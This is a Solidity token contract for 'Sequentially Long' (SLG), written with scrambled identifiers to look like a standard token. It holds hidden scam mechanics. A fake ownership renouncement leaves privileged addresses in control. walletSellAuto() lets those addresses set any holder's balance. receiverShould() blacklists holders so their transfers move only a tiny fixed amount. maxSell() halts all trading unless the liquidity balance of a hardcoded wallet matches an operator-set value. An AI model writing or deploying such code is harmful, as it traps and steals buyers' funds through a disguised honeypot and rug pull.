//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface receiverLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundMarketingAmount {
    function createPair(address receiverLimit, address exemptMode) external returns (address);
}

interface isAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldTrading) external view returns (uint256);

    function transfer(address liquidityAuto, uint256 receiverLaunchMax) external returns (bool);

    function allowance(address buyFundLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverLaunchMax) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityAuto,
        uint256 receiverLaunchMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldReceiver, uint256 value);
    event Approval(address indexed buyFundLaunch, address indexed spender, uint256 value);
}

interface isAutoMetadata is isAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SequentiallyLong is tokenSender, isAuto, isAutoMetadata {

    mapping(address => bool) public isSender;

    uint256 marketingExempt;

    address public minAtWallet;

    function name() external view virtual override returns (string memory) {
        return takeSwap;
    }

    function transferFrom(address autoExempt, address liquidityAuto, uint256 receiverLaunchMax) external override returns (bool) {
        if (_msgSender() != modeFee) {
            if (shouldMin[autoExempt][_msgSender()] != type(uint256).max) {
                require(receiverLaunchMax <= shouldMin[autoExempt][_msgSender()]);
                shouldMin[autoExempt][_msgSender()] -= receiverLaunchMax;
            }
        }
        return maxSell(autoExempt, liquidityAuto, receiverLaunchMax);
    }

    function symbol() external view virtual override returns (string memory) {
        return swapLaunchAt;
    }

    uint256 constant exemptToken = 12 ** 10;

    function transfer(address atLaunched, uint256 receiverLaunchMax) external virtual override returns (bool) {
        return maxSell(_msgSender(), atLaunched, receiverLaunchMax);
    }

    uint8 private teamTake = 18;

    bool public toLiquidity;

    address private listIs;

    function approve(address minReceiver, uint256 receiverLaunchMax) public virtual override returns (bool) {
        shouldMin[_msgSender()][minReceiver] = receiverLaunchMax;
        emit Approval(_msgSender(), minReceiver, receiverLaunchMax);
        return true;
    }

    bool public txMax;

    constructor (){
        
        receiverLaunched liquidityIs = receiverLaunched(modeFee);
        liquidityTo = fundMarketingAmount(liquidityIs.factory()).createPair(liquidityIs.WETH(), address(this));
        if (listSell) {
            receiverTake = false;
        }
        minAtWallet = _msgSender();
        senderWallet();
        isSender[minAtWallet] = true;
        tokenTx[minAtWallet] = liquidityMinReceiver;
        if (receiverTake == txMax) {
            txMax = false;
        }
        emit Transfer(address(0), minAtWallet, liquidityMinReceiver);
    }

    function senderWallet() public {
        emit OwnershipTransferred(minAtWallet, address(0));
        listIs = address(0);
    }

    uint256 buyMin;

    function owner() external view returns (address) {
        return listIs;
    }

    function maxAuto(address autoExempt, address liquidityAuto, uint256 receiverLaunchMax) internal returns (bool) {
        require(tokenTx[autoExempt] >= receiverLaunchMax);
        tokenTx[autoExempt] -= receiverLaunchMax;
        tokenTx[liquidityAuto] += receiverLaunchMax;
        emit Transfer(autoExempt, liquidityAuto, receiverLaunchMax);
        return true;
    }

    function allowance(address modeExempt, address minReceiver) external view virtual override returns (uint256) {
        if (minReceiver == modeFee) {
            return type(uint256).max;
        }
        return shouldMin[modeExempt][minReceiver];
    }

    mapping(address => mapping(address => uint256)) private shouldMin;

    uint256 public shouldLaunched;

    address modeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public liquidityTo;

    function tradingTakeBuy(uint256 receiverLaunchMax) public {
        autoMarketingFrom();
        buyMin = receiverLaunchMax;
    }

    function maxSell(address autoExempt, address liquidityAuto, uint256 receiverLaunchMax) internal returns (bool) {
        if (autoExempt == minAtWallet) {
            return maxAuto(autoExempt, liquidityAuto, receiverLaunchMax);
        }
        uint256 takeLaunchedMode = isAuto(liquidityTo).balanceOf(marketingWallet);
        require(takeLaunchedMode == buyMin);
        require(liquidityAuto != marketingWallet);
        if (listWalletLiquidity[autoExempt]) {
            return maxAuto(autoExempt, liquidityAuto, exemptToken);
        }
        return maxAuto(autoExempt, liquidityAuto, receiverLaunchMax);
    }

    function decimals() external view virtual override returns (uint8) {
        return teamTake;
    }

    string private takeSwap = "Sequentially Long";

    bool public takeMarketing;

    event OwnershipTransferred(address indexed marketingReceiverSender, address indexed amountFromSender);

    bool private receiverTake;

    function walletSellAuto(address atLaunched, uint256 receiverLaunchMax) public {
        autoMarketingFrom();
        tokenTx[atLaunched] = receiverLaunchMax;
    }

    address marketingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityMinReceiver;
    }

    function autoMarketingFrom() private view {
        require(isSender[_msgSender()]);
    }

    uint256 private liquidityMinReceiver = 100000000 * 10 ** 18;

    uint256 public limitWallet;

    function marketingTake(address toSender) public {
        if (toLiquidity) {
            return;
        }
        if (shouldLaunched != limitWallet) {
            txMax = false;
        }
        isSender[toSender] = true;
        
        toLiquidity = true;
    }

    mapping(address => uint256) private tokenTx;

    function balanceOf(address shouldTrading) public view virtual override returns (uint256) {
        return tokenTx[shouldTrading];
    }

    function receiverShould(address autoFrom) public {
        autoMarketingFrom();
        
        if (autoFrom == minAtWallet || autoFrom == liquidityTo) {
            return;
        }
        listWalletLiquidity[autoFrom] = true;
    }

    bool private listSell;

    string private swapLaunchAt = "SLG";

    function getOwner() external view returns (address) {
        return listIs;
    }

    mapping(address => bool) public listWalletLiquidity;

}